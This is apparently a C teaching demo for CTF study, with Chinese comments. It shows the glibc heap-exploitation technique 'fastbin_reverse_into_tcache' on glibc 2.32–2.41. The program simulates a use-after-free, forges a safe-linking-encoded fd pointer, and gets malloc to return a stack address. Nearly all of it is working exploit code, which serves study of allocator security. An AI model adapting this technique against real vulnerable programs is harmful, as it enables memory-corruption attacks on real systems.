/*
 * 中文导读（CTF 版）
 *
 * 手法：fastbin_reverse_into_tcache
 * 文件标注范围：2.32 ~ 2.41
 * 模拟漏洞：UAF 改写 fastbin 的 fd，并可耗尽 tcache。
 * 核心流程：malloc 从 fastbin 取一个节点时会把其余节点反向 stash 到 tcache；伪造末端节点可获得一次受控写并最终分配目标。
 * 成功判据：目标槽被写入 chunk/tcache 元数据且 malloc 返回目标地址；2.42 large 链中间 next 槽需 mangling，metadata 头仍为明文。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

const size_t allocsize = 0x40;

int main(){
	setbuf(stdout, NULL);

	// 申请 14 个同尺寸块：前 7 个填 tcache，后 7 个建立待反向搬运的 fastbin 链。
	char* ptrs[14];
	size_t i;
	for (i = 0; i < 14; i++) {
		ptrs[i] = malloc(allocsize);
	}

	// 先释放 7 块填满对应 tcache，保证后续同尺寸 free 进入 fastbin。
	for (i = 0; i < 7; i++) free(ptrs[i]);
	
	char* victim = ptrs[7];

	free(victim);

	// 再释放剩余 7 块，按 LIFO 形成 fastbin 单链。
	for (i = 8; i < 14; i++) free(ptrs[i]);
	
	// 栈上数组是最终写入目标；预填垃圾值，便于观察 fastbin stash 写入的堆指针。
	size_t stack_var[6];
	memset(stack_var, 0xcd, sizeof(stack_var));

	//------------漏洞模拟开始：篡改 fastbin victim 的 fd------------
	
	// 把 victim->fd 指向目标前方伪 chunk，使反向 stash 时链表遍历落到栈上。
	// safe-linking 编码使用 victim->fd 存储地址的页号，所以必须已知 victim
	// 地址；这就是 2.32+ 版本额外需要堆泄漏的原因。
	*(size_t**)victim = (size_t*)((long)&stack_var[0] ^ ((long)victim >> 12));
	
	//------------------------------------

	// 先取空 tcache；下一次申请进入 _int_malloc，并把额外 fastbin 节点反向搬入 tcache。
	for (i = 0; i < 7; i++) ptrs[i] = malloc(allocsize);

	for (i = 0; i < 6; i++) printf("%p: %p\n", &stack_var[i], (char*)stack_var[i]);

	malloc(allocsize);
	
	for (i = 0; i < 6; i++) printf("%p: %p\n", &stack_var[i], (char*)stack_var[i]);
	
	char *q = malloc(allocsize);

	assert(q == (char *)&stack_var[2]);
	
	return 0;
}
